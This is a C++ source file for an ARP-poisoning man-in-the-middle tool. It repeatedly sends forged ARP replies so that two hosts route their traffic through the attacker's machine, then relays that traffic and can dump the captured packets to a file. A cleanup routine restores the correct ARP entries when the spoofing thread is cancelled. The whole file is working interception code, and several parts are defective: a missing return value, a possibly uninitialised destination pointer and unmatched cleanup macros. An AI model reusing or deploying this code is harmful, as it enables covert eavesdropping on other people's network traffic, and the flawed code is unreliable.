#include "connection.h"
//implementation of connection
using __session_namespace::BuildEtherArp;
using __session_namespace::connection;
connection::connection(const target &t1,
		       const target &t2,
		       libnet_t *link,
		       pthread_mutex_t &linkMutex):m_link(link),                                                                        
						   m_linkMutex(linkMutex),
						   m_pcapRouter(NULL),
							m_dumpFd(-1),
						   m_pcapDumper(NULL),
						   m_spooferLock(PTHREAD_MUTEX_INITIALIZER),
						   m_routerLock(PTHREAD_MUTEX_INITIALIZER),
						   m_PcapErr(new char[PCAP_ERRBUF_SIZE])
{
    m_peers[0]=t1;
    m_peers[1]=t2;

    char filter[3*hwAddrStrLen+64];
    
    snprintf(filter,sizeof(filter),
       	"!arp and ether dst %hX:%hX:%hX:%hX:%hX:%hX and ether src %hX:%hX:%hX:%hX:%hX:%hX or ether src %hX:%hX:%hX:%hX:%hX:%hX",
	     ifInfo.m_hwAddr[0],
	     ifInfo.m_hwAddr[1],
	     ifInfo.m_hwAddr[2],
	     ifInfo.m_hwAddr[3],
	     ifInfo.m_hwAddr[4],
	     ifInfo.m_hwAddr[5],

	     m_peers[0].m_hwAddr[0],
	     m_peers[0].m_hwAddr[1],
	     m_peers[0].m_hwAddr[2],
	     m_peers[0].m_hwAddr[3],
	     m_peers[0].m_hwAddr[4],
	     m_peers[0].m_hwAddr[5],
	     
	     m_peers[1].m_hwAddr[0],
	     m_peers[1].m_hwAddr[1],
	     m_peers[1].m_hwAddr[2],
	     m_peers[1].m_hwAddr[3],
	     m_peers[1].m_hwAddr[4],
	     m_peers[1].m_hwAddr[5]);
    m_routerFilter=m_dumperFilter=filter;

    RebuildPackets();
}

connection::connection(const connection &conn):m_link(conn.m_link),
					       m_linkMutex(conn.m_linkMutex),
					       m_pcapRouter(NULL),
					       m_pcapDumper(NULL),
					       m_pcapDumpFile(NULL),
					       m_dumpFd(-1),
					       m_routerFilter(conn.m_routerFilter),
					       m_dumperFilter(conn.m_dumperFilter),
					       m_spooferThread(NULL),
					       m_routerThread(NULL),
					       m_spooferLock(PTHREAD_MUTEX_INITIALIZER),
					       m_routerLock(PTHREAD_MUTEX_INITIALIZER),
					       m_PcapErr(new char[PCAP_ERRBUF_SIZE])
 {
	m_peers[0]=conn.m_peers[0];
	m_peers[1]=conn.m_peers[1];
	RebuildPackets();
 }

connection::~connection()
{
    if(m_spooferThread)
	pthread_cancel(m_spooferThread);
    if(m_routerThread)
	pthread_cancel(m_routerThread);

    pthread_mutex_lock(&m_linkMutex);
    if(m_packets[0].m_packet)
	libnet_adv_free_packet(m_link,m_packets[0].m_packet);
    if(m_packets[1].m_packet)
	libnet_adv_free_packet(m_link,m_packets[1].m_packet);
    pthread_mutex_unlock(&m_linkMutex);
    
    if(m_PcapErr)
	delete[] m_PcapErr;

     close(m_dumpFd);
}

connection& connection::operator=(const connection &conn)
{
    m_link=conn.m_link;
    m_peers[0]=conn.m_peers[0];
    m_peers[1]=conn.m_peers[1];
    m_linkMutex=conn.m_linkMutex;
    m_routerFilter=conn.m_routerFilter;
    m_dumperFilter=conn.m_dumperFilter;
    return *this;
}

int connection::DoIt(const char *filter,int doSpoofing,int doRouting) throw()
{
    if(doSpoofing)
    {
	if((errno=pthread_create(&m_spooferThread,NULL,StartSpoofing,this)))
	    return -1;
    }
    if(filter)
    {
	m_dumperFilter+=" and ";
	m_dumperFilter+=filter;
	m_routerFilter=m_dumperFilter;
    }
    if(doRouting)
    {
	if((errno=pthread_create(&m_routerThread,NULL,StartRouting,this)))
	    return -1;
    }
}
void connection::RebuildPackets() throw(PredException)
{
    pthread_mutex_lock(&m_linkMutex);
    
    BuildEtherArp(ARPOP_REPLY,
		  ifInfo.m_hwAddr,//our MAC
		  &m_peers[1].m_prAddr.sin_addr.s_addr,//but spoofed protocol addr.
		  m_peers[0].m_hwAddr,//target MAC
		  &m_peers[0].m_prAddr.sin_addr.s_addr);//target ip of request
    
    if(libnet_adv_cull_packet(m_link,&m_packets[0].m_packet,&m_packets[0].m_packet_s)<0)
	throw PredException(libnet_geterror(m_link));
    //same as before
    BuildEtherArp(ARPOP_REPLY,
		  ifInfo.m_hwAddr,
		  &m_peers[0].m_prAddr.sin_addr.s_addr,
		  m_peers[1].m_hwAddr,
		  &m_peers[1].m_prAddr.sin_addr.s_addr);

    if(libnet_adv_cull_packet(m_link,&m_packets[1].m_packet,&m_packets[1].m_packet_s)<0)
	throw PredException(libnet_geterror(m_link));

    pthread_mutex_unlock(&m_linkMutex);

}

void connection::Normalize() throw(PredException)
{
    pthread_mutex_lock(&m_linkMutex);
    
    BuildEtherArp(ARPOP_REPLY,
		  m_peers[1].m_hwAddr,
		  &m_peers[1].m_prAddr.sin_addr.s_addr,
		  m_peers[0].m_hwAddr,
		  &m_peers[0].m_prAddr.sin_addr.s_addr);
    
    if(libnet_write(m_link)<0)
	throw PredException(libnet_geterror(m_link));

    BuildEtherArp(ARPOP_REPLY,
		  m_peers[0].m_hwAddr,
		  &m_peers[0].m_prAddr.sin_addr.s_addr,
		  m_peers[1].m_hwAddr,
		  &m_peers[1].m_prAddr.sin_addr.s_addr);

    if(libnet_write(m_link)<0)
	throw PredException(libnet_geterror(m_link));

    printf("Had been normalized\n");//debug
    pthread_mutex_unlock(&m_linkMutex);
}

void* connection::StartSpoofing(void *conn)
{
    connection *Connection=reinterpret_cast<connection*>(conn);
    pthread_cleanup_push(CleanerMutex,&Connection->m_linkMutex);
    try
    {
	Connection->Spoofer();
    }
    catch(PredException &exc)
    {
	printf(exc.what());
	PredException *status=new PredException(exc);	
	return reinterpret_cast<void*>(status);
    }
}
void connection::Spoofer() throw(PredException)
{
    int error=0;
    pthread_mutexattr_t spooferMutexAttr;
    if((error=pthread_mutexattr_init(&spooferMutexAttr)))
	throw PredException("pthread_mutexattr_init()",error);
    if((error=pthread_mutexattr_settype(&spooferMutexAttr,PTHREAD_MUTEX_ERRORCHECK)))
	throw PredException("pthread_mutexattr_settype()",error);
    if((error=pthread_mutex_init(&m_spooferLock,&spooferMutexAttr)))
	throw PredException("pthread_mutex_init()",error);
    pthread_mutexattr_destroy(&spooferMutexAttr);
    
    if((error=pthread_mutex_lock(&m_spooferLock)))
	throw PredException("pthread_mutex_lock()",error);
    pthread_cleanup_push(CleanerMutex,&m_spooferLock);
    
    pthread_cleanup_push(CleanerSpoof,this);//will call Normalize()
    int old;//not really interested...
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE,&old);
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS,&old);

    for(;;)
    {	
	printf("p[0]:%02hX:%02hX:%02hX:%02hX:%02hX:%02hX\n", //debug
		m_peers[0].m_hwAddr[0],
		m_peers[0].m_hwAddr[1],
		m_peers[0].m_hwAddr[2],
		m_peers[0].m_hwAddr[3],
		m_peers[0].m_hwAddr[4],
		m_peers[0].m_hwAddr[5]);
	printf("p[1]:%02hX:%02hX:%02hX:%02hX:%02hX:%02hX\n",
		m_peers[1].m_hwAddr[0],
		m_peers[1].m_hwAddr[1],
		m_peers[1].m_hwAddr[2],
		m_peers[1].m_hwAddr[3],
		m_peers[1].m_hwAddr[4],
		m_peers[1].m_hwAddr[5]);
	fflush(stdout);

	pthread_mutex_lock(&m_linkMutex);
	    
	if(libnet_adv_write_link(m_link,m_packets[0].m_packet,m_packets[0].m_packet_s)<0)
	    throw PredException(libnet_geterror(m_link));

	if(libnet_adv_write_link(m_link,m_packets[1].m_packet,m_packets[1].m_packet_s)<0)
	    throw PredException(libnet_geterror(m_link));    
		
	pthread_mutex_unlock(&m_linkMutex);

	sleep(PoisonDelay);
    }
}

inline void connection::BuildEtherArp(u_int16_t arpOp,u_int8_t *shwAddr,in_addr_t *sprAddr,u_int8_t *dhwAddr,in_addr_t *dprAddr) throw(PredException)
{
    __session_namespace::BuildEtherArp(arpOp,shwAddr,sprAddr,dhwAddr,dprAddr,m_link);
}

int connection::IsEqual(const target &t1,const target &t2) const throw()
{
    return ((m_peers[0]==t1 && m_peers[1]==t2) || 
	    (m_peers[0]==t2 && m_peers[1]==t1));
}

int connection::operator==(const connection &conn) const throw()
{
     return ((m_peers[0]==conn.m_peers[0] && m_peers[1]==conn.m_peers[1]) || 
	     (m_peers[0]==conn.m_peers[1] && m_peers[1]==conn.m_peers[0]));
}

int connection::Dump(const char *filter,//unused by now
		     const char *file,
		     size_t snaplen)
{
    if(!m_routerThread || m_dumpFd>=0)
	return -1;
    
    m_dumpSnaplen=snaplen;
    if(!file)
	m_dumpFile="dump";
    else m_dumpFile=file;
    
    if((m_dumpFd=open(m_dumpFile.c_str(),O_WRONLY|O_CREAT|O_TRUNC,0644))<0)
	return -1;

    return 0;
}

void* connection::StartRouting(void *conn)
{
    connection *Connection=reinterpret_cast<connection*>(conn);
    try
    {
	Connection->Router();
    }
    catch(PredException &exc)
    {
	printf(exc.what());//debug
	PredException *status=new PredException(exc);	
	return reinterpret_cast<void*>(status);
    }    
}


void connection::Router() throw(PredException)
{
    int error=0;
    pthread_mutexattr_t routerMutexAttr;
    if((error=pthread_mutexattr_init(&routerMutexAttr)))
	throw PredException("pthread_mutexattr_init()",error);
    if((error=pthread_mutexattr_settype(&routerMutexAttr,PTHREAD_MUTEX_ERRORCHECK)))
	throw PredException("pthread_mutexattr_settype()",error);
    if((error=pthread_mutex_init(&m_routerLock,&routerMutexAttr)))
	throw PredException("pthread_mutex_init()",error);
    pthread_mutexattr_destroy(&routerMutexAttr);
    
    if((error=pthread_mutex_lock(&m_routerLock)))
	throw PredException("pthread_mutex_lock()",error);
    pthread_cleanup_push(CleanerMutex,&m_routerLock);
    int old;
    pthread_setcancelstate(PTHREAD_CANCEL_ENABLE,&old);
    pthread_setcanceltype(PTHREAD_CANCEL_ASYNCHRONOUS,&old);

    if(!(m_pcapRouter=pcap_open_live(ifInfo.m_name,routeSnaplen,1,pcapTimeout,m_PcapErr)))
	throw PredException(m_PcapErr);

    pthread_cleanup_push(CleanerPcap,m_pcapRouter);
    
    //if(m_pcapDumpFile)
	//pthread_cleanup_push(CleanerPcapDump,m_pcapDumpFile);
    
    ioctl(pcap_fileno(m_pcapRouter),BIOCIMMEDIATE,&ifInfo.m_immed);
    
    bpf_program fp;
    if(pcap_compile(m_pcapRouter,&fp, const_cast<char*>(m_routerFilter.c_str()),1,0x0)<0)
	throw PredException(pcap_geterr(m_pcapRouter));
    if(pcap_setfilter(m_pcapRouter,&fp)<0)
	throw PredException(pcap_geterr(m_pcapRouter));
    pcap_freecode(&fp);

    if(__session_namespace::pcap_loop(m_pcapRouter,-1,ProcessPacket,reinterpret_cast<u_int8_t*>(this))<0)
	throw PredException(pcap_geterr(m_pcapRouter));
}

void connection::ProcessPacket(void *conn,
			       const struct pcap_pkthdr *pcapHdr,
			       const u_int8_t *packet)//for router
{
    connection *Connection=reinterpret_cast<connection *>(conn);
 
    ethernet_hdr *ethHdr;
    ipv4_hdr *ipHdr;
    reinterpret_cast<u_int8_t*>(ethHdr)=packet;
    reinterpret_cast<u_int8_t*>(ipHdr)=packet+ethHdrLen;
    
    printf("Routing something... ");//debug
    target *dest;//what peer is a destination?
    if(ethHdr->ether_type==htons(ETHERTYPE_IP))
    {
	printf("Routing an IP dgram\n");//debug
	if(Connection->m_peers[0]==ipHdr->ip_dst.s_addr)
	    dest=Connection->m_peers;
	else if(Connection->m_peers[1]==ipHdr->ip_dst.s_addr)
	    dest=Connection->m_peers+1;
    
	memcpy(ethHdr->ether_dhost,dest->m_hwAddr,hwAddrLen);
	memcpy(ethHdr->ether_shost,ifInfo.m_hwAddr,hwAddrLen);
    }
    
    if(Connection->m_dumpFd>=0)
    {
	write(Connection->m_dumpFd,
	      packet,
	      Connection->m_dumpSnaplen<=pcapHdr->caplen?Connection->m_dumpSnaplen:pcapHdr->caplen);
    }
    pthread_mutex_lock(&Connection->m_linkMutex);
    if(libnet_adv_write_link(Connection->m_link,const_cast<u_int8_t*>(packet),pcapHdr->len)>=0)
	printf("Routed\n");//debug
    pthread_mutex_unlock(&Connection->m_linkMutex);
}

void connection::CleanerSpoof(void *conn)
{
    connection *Connection=reinterpret_cast<connection *>(conn);
    Connection->Normalize();
}

